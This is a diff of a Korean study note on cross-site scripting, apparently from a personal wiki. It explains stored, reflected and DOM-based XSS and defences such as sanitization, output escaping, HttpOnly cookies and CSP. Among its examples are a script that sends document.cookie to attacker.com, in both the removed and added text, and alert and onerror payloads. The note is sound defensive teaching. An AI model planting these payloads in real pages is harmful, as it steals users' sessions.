@@ -1,85 +1,190 @@
 ---
 created: 2025-03-30 21:07:44 +0900
-updated: 2025-03-31 21:07:06 +0900
+updated: 2026-03-23 23:42:09 +0900
 title: 'XSS (Cross-Site Scripting)'
 tags: ["security", "XSS", "web"]
 ---
 
 ## 개요
 
--   **정의**: 공격자가 웹 사이트에 악성 스크립트를 삽입하여 다른 사용자가 해당 페이지를 볼 때 실행되도록 하는 공격
--   **작동 방식**:
-	1.  공격자는 게시판, 댓글, URL 파라미터 등을 통해 악성 스크립트를 웹 서버에 삽입함
-	2.  피해자가 해당 페이지를 방문하면 악성 스크립트가 피해자의 브라우저에서 실행함
-	3.  스크립트는 쿠키, 세션 토큰 등 민감한 정보를 탈취하거나, 웹 페이지의 내용을 변조하거나, 사용자를 악성 사이트로 리디렉션할 수 있음
-	
+**정의:** 공격자가 웹 사이트에 악성 스크립트를 삽입하여, 다른 사용자가 해당 페이지를 방문할 때 그 스크립트가 피해자의 브라우저에서 실행되도록 하는 공격
+
+**작동 방식:**
+1. 공격자가 게시판, 댓글, URL 파라미터 등을 통해 악성 스크립트를 삽입
+2. 피해자가 해당 페이지를 방문하면 악성 스크립트가 피해자의 브라우저에서 실행
+3. 스크립트는 쿠키·세션 토큰 탈취, 페이지 변조, 악성 사이트로의 리디렉션 등을 수행
+
+## XSS 유형
+
+### 1. Stored XSS (저장형)
+
+1. 공격자가 댓글 작성
+2. 서버가 sanitize 없이 DB에 그대로 저장
+3. 피해자가 게시글 페이지 방문
+4. 서버가 DB에서 댓글을 꺼내 HTML에 삽입하여 응답
+5. 피해자 브라우저가 HTML을 파싱하면서 스크립트 태그를 만남
+6. fetch 실행하여 쿠키 전송
+
+```html
+<!-- 공격자가 게시판에 작성한 댓글 -->
+<script>
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: document.cookie,  // HttpOnly 미설정 시 탈취 가능
+    mode: 'no-cors'
+  });
+</script>
+```
+
+> 현대 브라우저에서의 동작 한계
+> - `HttpOnly` 플래그가 설정된 쿠키는 `document.cookie`로 접근 불가 → 탈취 무력화
+> - 따라서 인증 쿠키에 `HttpOnly`를 설정하는 것이 핵심 방어선
+
+### 2. Reflected XSS (반사형)
+악성 스크립트가 URL 파라미터 등을 통해 서버로 전달되고, 서버가 이를 그대로 응답에 포함시켜 **즉시 실행**
+
+```
+https://example.com/search?q=<script>alert('XSS')</script>
+```
+
+- 서버가 검색어를 그대로 HTML에 출력하면 스크립트가 실행
+- 주로 피싱 링크 형태로 배포
+
+### 3. DOM-based XSS
+서버를 거치지 않고 **클라이언트 JavaScript**가 DOM을 직접 조작할 때 발생
+
+```javascript
+// URL: https://example.com/#<img src=x onerror=alert('XSS')>
+
+// 취약한 코드
+const input = location.hash.slice(1);
+document.getElementById('output').innerHTML = input; // 즉시 실행됨
+
+// 입력을 HTML로 파싱하지 않도록 텍스트로만 처리
+document.getElementById('output').textContent = input; // 텍스트로만 처리
+```
+
 ## 예방
 
--   입력 값 검증 (Input Validation): 사용자 입력을 받을 때 HTML 태그, 특수 문자 등을 필터링하거나 이스케이프 처리함
--   출력 값 인코딩 (Output Encoding): 웹 페이지에 데이터를 출력할 때 HTML 엔티티로 인코딩하여 스크립트가 실행되지 않도록 함
--   Content Security Policy (CSP) 설정: 브라우저가 특정 출처에서만 스크립트를 실행하도록 제한함
+### 1. 입력값 검증 (Sanitization)
 
-## 예시
+사용자 입력을 저장하거나 처리하기 전에 위험한 태그와 속성 제거
 
-**시나리오:** 웹사이트의 게시판 기능에 XSS 취약점이 존재하는 경우
+```javascript
+const express = require('express');
+const sanitizeHtml = require('sanitize-html');
+const app = express();
 
-1.  **공격:**
+app.use(express.urlencoded({ extended: true }));
 
-    ```html title="공격자는 다음과 같은 악성 스크립트가 포함된 게시글 작성"
-    <script>
-      fetch('http://attacker.com/steal', {
-        method: 'POST',
-        body: document.cookie,
-        mode: 'no-cors' // CORS 우회
-      });
-    </script>
-    ```
+app.post('/post', (req, res) => {
+  const dirty = req.body.content;
+  const clean = sanitizeHtml(dirty, {
+    allowedTags: sanitizeHtml.defaults.allowedTags.concat(['img']),
+    allowedAttributes: {
+      'img': ['src', 'alt']
+      // 'onerror' 같은 이벤트 핸들러는 자동으로 차단됨
+    }
+  });
+  // DB에 clean 저장
+  res.send('Post received');
+});
+```
 
-2.  **영향:**
+### 2. 출력값 인코딩 (Escaping)
 
-    -   다른 사용자가 해당 게시글을 포함한 페이지를 방문하면, 스크립트가 실행됨
-    -   스크립트는 방문자의 쿠키 정보를 공격자의 서버로 전송
+데이터를 화면에 출력할 때 HTML 엔티티로 인코딩하여 스크립트가 실행되지 않도록 함
 
-3.  **대비 방법:**
+**EJS 템플릿 (서버 렌더링)**
+```html
+<%- post.content %>  <!-- 취약(-): HTML 그대로 출력 -->
+<%= post.content %>  <!-- 안전(=): HTML 이스케이프 처리 -->
+```
 
-    -   **입력 값 검증 (Sanitization):**
-	```javascript caption="게시글 입력 시 HTML 태그를 제거하거나, 특수 문자를 이스케이프 처리"
-	const app = express();
-	const express = require('express');
-	const sanitizeHtml = require('sanitize-html');
+**React (현대적 접근)**
 
-	app.use(express.urlencoded({ extended: true }));
+React는 기본적으로 모든 출력을 이스케이프 처리. 오히려 명시적으로 우회할 때가 위험
 
-	app.post('/post', (req, res) => {
-	  const dirty = req.body.content;
-	  const clean = sanitizeHtml(dirty, {
-	    allowedTags: sanitizeHtml.defaults.allowedTags.concat([ 'img' ]),
-	    allowedAttributes: {
-	      'img': [ 'src', 'alt' ]
-	    }
-	  });
-	  console.log(clean);
-	  res.send('Post received');
-	});
-	```
+```jsx
+// 안전: React가 자동으로 이스케이프
+<div>{userInput}</div>
 
-    -   **출력 값 인코딩 (Escaping):**
-	```html caption="게시글을 화면에 표시할 때 HTML 엔티티로 인코딩"
-	<%- post.content %>  // XSS 취약
-	<%= post.content %>  // 안전 (HTML 이스케이프)
-	```
+// 취약: 명시적으로 XSS 위험을 감수하겠다는 선언
+<div dangerouslySetInnerHTML={{ __html: userInput }} />
 
-    -   **CSP 설정:**
-	```javascript caption="HTTP 응답 헤더에 Content-Security-Policy를 설정하여 허용된 스크립트 출처를 명시"
-	app.use((req, res, next) => {
-	  res.setHeader(
-	    'Content-Security-Policy',
-	    "default-src 'self'; script-src 'self'"
-	  );
-	  next();
-	});
+// dangerouslySetInnerHTML이 꼭 필요하다면 sanitize 후 사용
+import DOMPurify from 'dompurify';
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
+```
 
-## 참고
+### 3. HttpOnly 쿠키 설정
 
-- Google Gemini 답변
+XSS가 발생하더라도 인증 쿠키가 탈취되지 않도록 JavaScript 접근을 차단
 
+```
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+- `HttpOnly` → `document.cookie`로 접근 불가 → XSS로 인한 쿠키 탈취 방어
+- `Secure` → HTTPS에서만 전송
+- `SameSite=Strict` → 타 사이트 요청 시 쿠키 전송 차단
+
+### 4. Content Security Policy (CSP)
+
+브라우저가 허가된 출처의 스크립트만 실행하도록 제한
+
+```javascript
+app.use((req, res, next) => {
+  res.setHeader(
+    'Content-Security-Policy',
+    "default-src 'self'; script-src 'self'"
+    // 인라인 스크립트 및 외부 출처 스크립트 전면 차단
+  );
+  next();
+});
+```
+
+
+인라인 스크립트가 꼭 필요한 경우, 전면 허용 대신 `nonce` 방식을 사용
+
+```javascript
+// Next.js 기준 (middleware.js)
+import { NextResponse } from 'next/server'
+import crypto from 'crypto'
+
+export function middleware(req) {
+  const nonce = crypto.randomBytes(16).toString('base64')
+  
+  const response = NextResponse.next()
+  response.headers.set(
+    'Content-Security-Policy',
+    `script-src 'self' 'nonce-${nonce}'`
+  )
+  
+  return response
+}
+
+// 컴포넌트에서
+export default function Page({ nonce }) {
+  return (
+    <script nonce={nonce} dangerouslySetInnerHTML={{
+      __html: `const userId = 123`
+    }} />
+  )
+}
+```
+
+Electron도 렌더러 프로세스의 설정에 따라 Node 환경에 직접 접근할 수 있는 통로가 열릴 수 있기 때문에 CSP에 민감
+
+## 예방 전략 요약
+
+| 예방 방법 | 방어 대상 | 적용 위치 |
+|---|---|---|
+| 입력값 검증 (Sanitization) | Stored, Reflected XSS | 서버 |
+| 출력값 인코딩 (Escaping) | Stored, Reflected XSS | 서버/클라이언트 |
+| `textContent` 사용 | DOM-based XSS | 클라이언트 |
+| HttpOnly 쿠키 | 쿠키 탈취 피해 최소화 | 서버 |
+| CSP 설정 | 전체 XSS | 서버 (HTTP 헤더) |
+
+
+> 단일 방어책에 의존하지 않고, 여러 계층을 함께 적용하는 **심층 방어(Defense in Depth)** 전략이 핵심
